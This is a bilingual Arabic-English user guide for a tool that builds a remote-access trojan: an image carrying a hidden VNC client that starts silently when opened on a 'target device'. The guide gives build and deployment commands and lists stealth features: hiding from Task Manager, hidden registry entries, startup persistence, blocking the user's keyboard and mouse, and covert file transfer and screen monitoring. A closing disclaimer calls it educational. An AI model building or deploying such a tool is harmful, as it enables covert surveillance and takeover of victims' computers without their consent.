# دليل TSM-SeniorOasisPanel الكامل
# Complete TSM-SeniorOasisPanel Guide

## نظرة عامة | Overview
نظام TSM-SeniorOasisPanel هو نظام نقل ملفات متقدم مع إمكانيات VNC مخفية وتشفير الصور. يعمل النظام بشكل مخفي تماماً عند تنزيل الصورة على سطح المكتب.

TSM-SeniorOasisPanel is an advanced file transfer system with hidden VNC capabilities and image steganography. The system operates completely hidden when the image is downloaded to the desktop.

## المكونات الرئيسية | Main Components

### 1. الخادم الأساسي | Core Server
- **TSM_SeniorOasisPanel_server.py** - خادم TCP متعدد العملاء
- **TSM_SeniorOasisPanel_client.py** - عميل مع وضع مخفي

### 2. نظام التشفير | Steganography System
- **TSM_ImageSteganography.py** - تشفير LSB للصور
- **TSM_AutoVNC.py** - VNC تلقائي مخفي
- **TSM_StealthMode.py** - الوضع المخفي الكامل

### 3. التحكم في الإدخالات | Input Control
- **TSM_InputController.py** - حجب إدخالات المستخدم
- **TSM_EnhancedVNC.py** - VNC محسن للتحكم الكامل

### 4. المشغل التلقائي | Auto Launcher
- **TSM_AutoLauncher.py** - مشغل تلقائي متقدم
- **TSM_HiddenLauncher.py** - مشغل مخفي

## طريقة الاستخدام | Usage Instructions

### الخطوة 1: إعداد الخادم | Step 1: Server Setup
```bash
# تشغيل الخادم
python TSM_SeniorOasisPanel_server.py

# تشغيل خادم VNC المحسن
python TSM_EnhancedVNC.py server
```

### الخطوة 2: إنشاء الصورة المخفية | Step 2: Create Stealth Image
```bash
# إنشاء صورة مع VNC مخفي
python TSM_StealthMode.py create photo.jpg localhost 5001

# إنشاء حزمة نشر مخفية
python TSM_StealthMode.py package photo.jpg your-server.com 5001

# إنشاء مثبت مخفي
python TSM_StealthMode.py installer photo.jpg your-server.com 5001
```

### الخطوة 3: النشر | Step 3: Deployment
1. **نسخ الصورة المخفية** إلى الجهاز المستهدف
2. **تشغيل الصورة** - سيبدأ VNC تلقائياً في الخلفية
3. **التحكم الكامل** في الشاشة من الخادم

## الميزات المتقدمة | Advanced Features

### 1. VNC المخفي | Hidden VNC
- **تفعيل تلقائي** عند فتح الصورة
- **حجب إدخالات المستخدم** مؤقتاً
- **السيطرة الكاملة** على الشاشة
- **إخفاء من مدير المهام**

### 2. التحكم في النظام | System Control
- **حجب الماوس ولوحة المفاتيح**
- **إخفاء جميع النوافذ**
- **إخفاء شريط المهام**
- **محاكاة الإدخالات**

### 3. الأمان والخفاء | Security & Stealth
- **تشفير LSB** للصور
- **إخفاء العملية** من مدير المهام
- **أسماء مخفية** في سجل Windows
- **تنفيذ في الخلفية**

## سيناريوهات الاستخدام | Usage Scenarios

### السيناريو 1: التحكم عن بُعد | Remote Control
1. إنشاء صورة مخفية مع VNC
2. إرسال الصورة للجهاز المستهدف
3. فتح الصورة - يبدأ VNC تلقائياً
4. التحكم الكامل في الشاشة من الخادم

### السيناريو 2: مراقبة مخفية | Hidden Monitoring
1. إنشاء حزمة نشر مخفية
2. تثبيت الحزمة على الجهاز المستهدف
3. VNC يعمل تلقائياً عند بدء التشغيل
4. مراقبة مستمرة للشاشة

### السيناريو 3: نقل ملفات مخفي | Hidden File Transfer
1. تشغيل خادم TSM
2. إنشاء عميل مخفي في الصورة
3. فتح الصورة - يبدأ العميل تلقائياً
4. نقل الملفات بشكل مخفي

## الأمان | Security

### حماية الخادم | Server Security
- **فلترة أسماء الملفات** لمنع هجمات directory traversal
- **حدود حجم الملفات** لمنع استنزاف الذاكرة
- **تسجيل شامل** لجميع العمليات
- **دعم متعدد العملاء** مع عزل آمن

### حماية العميل | Client Security
- **التنفيذ المخفي** في الخلفية
- **إخفاء من مدير المهام**
- **أسماء مخفية** في سجل Windows
- **تنظيف تلقائي** للملفات المؤقتة

### حماية التشفير | Steganography Security
- **تشفير LSB** متقدم
- **ضغط البيانات** مع zlib
- **رؤوس سحرية** للتحقق
- **معالجة الأخطاء** الشاملة

## استكشاف الأخطاء | Troubleshooting

### مشاكل الاتصال | Connection Issues
```bash
# فحص حالة الخادم
python TSM_SystemTest.py

# اختبار الاتصال
python TSM_SeniorOasisPanel_client.py
```

### مشاكل VNC | VNC Issues
```bash
# تشغيل VNC المحسن
python TSM_EnhancedVNC.py client

# اختبار التحكم في الإدخالات
python TSM_InputController.py
```

### مشاكل التشفير | Steganography Issues
```bash
# التحقق من الصورة المخفية
python TSM_ImageSteganography.py verify hidden_image.png

# استخراج العميل من الصورة
python TSM_ImageSteganography.py extract hidden_image.png client.py
```

## الأداء | Performance

### تحسين الخادم | Server Optimization
- **ضبط max_clients** حسب سعة النظام
- **تعديل buffer_size** حسب ظروف الشبكة
- **مراقبة استخدام الذاكرة**
- **تحسين معالجة الملفات**

### تحسين VNC | VNC Optimization
- **ضبط frame_rate** للأداء الأمثل
- **تعديل quality** للجودة المطلوبة
- **ضغط البيانات** المتقدم
- **إدارة الاتصالات** الذكية

## الصيانة | Maintenance

### المهام الدورية | Regular Tasks
- **مراقبة سجلات الخادم**
- **تنظيف الملفات المؤقتة**
- **تحديث إعدادات الأمان**
- **نسخ احتياطي** لمجلد server_files

### التحديثات | Updates
- **اختبار الإصدارات الجديدة** في بيئة معزولة
- **نسخ احتياطي** للإعدادات الموجودة
- **تحديث العملاء** الموزعين
- **التحقق من التوافق**

## الدعم الفني | Technical Support

### الملفات المطلوبة | Required Files
- **Python 3.7+** مع مكتبات Pillow
- **Windows** مع دعم win32api
- **اتصال شبكة** للخادم والعميل
- **مساحة قرص** كافية للملفات

### المتطلبات | Requirements
```bash
# تثبيت المتطلبات
pip install pillow pywin32

# تشغيل الاختبارات
python TSM_SystemTest.py
```

## التحذيرات القانونية | Legal Warnings

⚠️ **تحذير مهم | Important Warning**

هذا النظام مخصص للأغراض التعليمية والاختبار المصرح به فقط. المستخدمون مسؤولون عن ضمان الامتثال لجميع القوانين واللوائح المعمول بها فيما يتعلق بـ:

This system is intended for educational and authorized testing purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations regarding:

- **أمن الشبكة | Network Security**
- **خصوصية البيانات | Data Privacy**
- **أذونات الوصول عن بُعد | Remote Access Permissions**
- **استخدام التشفير | Steganography Usage**

**احصل دائماً على إذن صريح قبل نشر هذا النظام في أي بيئة.**

**Always obtain explicit permission before deploying this system in any environment.**

## الخلاصة | Conclusion

نظام TSM-SeniorOasisPanel يوفر حلاً شاملاً لنقل الملفات المخفي والتحكم عن بُعد. مع ميزاته المتقدمة في التشفير والخفاء، يمكن استخدامه لأغراض تعليمية واختبارية متقدمة.

The TSM-SeniorOasisPanel system provides a comprehensive solution for hidden file transfer and remote control. With its advanced steganography and stealth features, it can be used for advanced educational and testing purposes.

---

**تم تطوير هذا النظام بواسطة TSM-SeniorOasisPanel Team**
**Developed by TSM-SeniorOasisPanel Team**

**الإصدار | Version: 2.0.0**
**التاريخ | Date: 2024**
